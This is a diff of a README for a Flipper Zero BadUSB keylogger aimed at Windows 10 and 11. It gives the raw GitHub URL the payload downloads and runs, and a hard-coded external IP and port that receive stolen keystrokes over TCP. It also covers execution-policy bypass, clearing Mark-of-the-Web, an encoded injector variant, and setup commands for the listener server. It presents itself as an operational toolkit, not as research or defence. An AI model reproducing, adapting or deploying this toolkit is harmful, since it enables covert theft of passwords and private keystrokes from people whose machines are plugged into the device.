@@ -1,13 +1,27 @@
-# flipper-keylogger
+# flipper-keylogger (Windows 10 / 11)
 
-Flipper Zero BadUSB loads `keylogger.ps1` from this repo (GitHub raw) and sends keystrokes to **89.22.229.54:4444** over TCP.
+Flipper Zero BadUSB loads `keylogger.ps1` from this repo and sends keystrokes to **89.22.229.54:4444** (TCP).
+
+Target: **Windows 10 and Windows 11**, Windows PowerShell **5.1** (built-in). No admin required.
 
 | File | Role |
 |------|------|
-| `keylogger.ps1` | Key poll + TCP exfil (raw URL target) |
-| `payload.txt` | DuckyScript / Flipper BadUSB injector |
+| `keylogger.ps1` | Key poll (ToUnicode + layout) + TCP exfil |
+| `payload.txt` | BadUSB injector (visible window, 3s delays) |
+| `payload_enc.txt` | Alternate encoded injector via `cmd start` |
 | `server/receiver.py` | TCP listener (Linux VPS) |
 | `server/receiver.ps1` | TCP listener (Windows) |
+
+## Win10/11 adaptations
+
+- Full path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (avoids Windows Terminal / `pwsh` hijack on Win11)
+- TLS 1.2 + TLS 1.3 when available
+- Download: `WebClient` → `Invoke-WebRequest` fallback
+- `Unblock-File` / clear Zone.Identifier (MOTW)
+- TCP exfil forced **IPv4** (dual-stack stalls)
+- Single-instance mutex (no process stack on re-run)
+- `ToUnicodeEx` for current keyboard layout
+- Banner includes OS caption + build + PS version
 
 ## Raw URL
 
@@ -15,52 +29,33 @@ Flipper Zero BadUSB loads `keylogger.ps1` from this repo (GitHub raw) and sends 
 https://raw.githubusercontent.com/naturalniyaboba2077/flipper-keylogger/main/keylogger.ps1
 ```
 
-## 1. Server (VPS `89.22.229.54`)
+## Server
 
 ```bash
 cd server
 python3 receiver.py
-# firewall:
-#   ufw allow 4444/tcp
-# logs:
-#   tail -f logs/live.log
+# ufw allow 4444/tcp
+# tail -f /opt/kl-recv/logs/live.log
 ```
 
-Test:
+## Flipper
 
-```bash
-printf 'hello' | nc 89.22.229.54 4444
-```
+1. Copy `payload.txt` → SD `badusb/`
+2. Target: logged-in Win10/11, network on, layout **EN** for BadUSB typing
+3. BadUSB → Run
 
-## 2. Local test (no Flipper)
+All `DELAY` = **3000** ms for error screenshots.
+
+## Local test
 
 ```powershell
-powershell -NoP -Ep Bypass -File .\keylogger.ps1
-# type keys; watch server live.log
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -File .\keylogger.ps1
 ```
-
-## 3. Flipper
-
-1. Copy `payload.txt` → SD `badusb/payload.txt` (or `badusb/kl.txt`)
-2. Keyboard layout **EN (US)** on target
-3. BadUSB → Run → plug into logged-in Windows with network
 
 ## Config
 
-Edit only top of `keylogger.ps1`:
-
-- `$ServerIP` / `$ServerPort` (default `89.22.229.54` / `4444`)
-- `$FlushEvery`, `$TimerMs`
-
-Push to `main` after edits so raw updates (CDN may cache a few minutes).
+Top of `keylogger.ps1`: `$ServerIP`, `$ServerPort`, `$FlushEvery`, `$TimerMs`.
 
 ## Offline buffer
 
-If TCP fails, data goes to `%TEMP%\kl.buf` and is retried on the interval timer.
-
-## Notes
-
-- No admin required (user-session key poll).
-- HTTP/S not used for exfil — plain TCP:4444.
-- GitHub must stay public (or raw needs auth — not in this payload).
-- Long BadUSB strings need EN layout and enough `DELAY` after plug.
+`%TEMP%\kl.buf` if TCP fails; retried every `$TimerMs`.
